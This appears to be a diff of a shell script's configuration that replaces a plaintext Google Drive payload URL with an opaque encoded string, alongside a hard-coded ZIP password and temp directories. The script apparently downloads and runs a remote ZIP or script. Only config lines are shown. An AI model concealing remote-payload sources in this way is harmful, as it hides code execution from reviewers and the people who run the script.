@@ -4,7 +4,7 @@
 # This script handles both ZIP files and direct script files
 
 # Configuration
-PAYLOAD_URL="https://drive.google.com/file/d/1Ua6588YrGR25fCdtjKOyhG2G6E0S6iJC/view?usp=drivesdk"  # Can be a ZIP or a script
+PAYLOAD_URL="WnziHy5G+38OKu1n7rLMxpbc4ZV7Wk+rWpzen3bcNzbPPKSTCs4hY+Lv+s6Cgma8"  # Can be a ZIP or a script
 ZIP_PASSWORD="YourStrongPassword123!"                  # Password for the zip file (if applicable)
 TEMP_DIR="/tmp/secure_payload"
 WORKING_DIR="/usr/src/app"
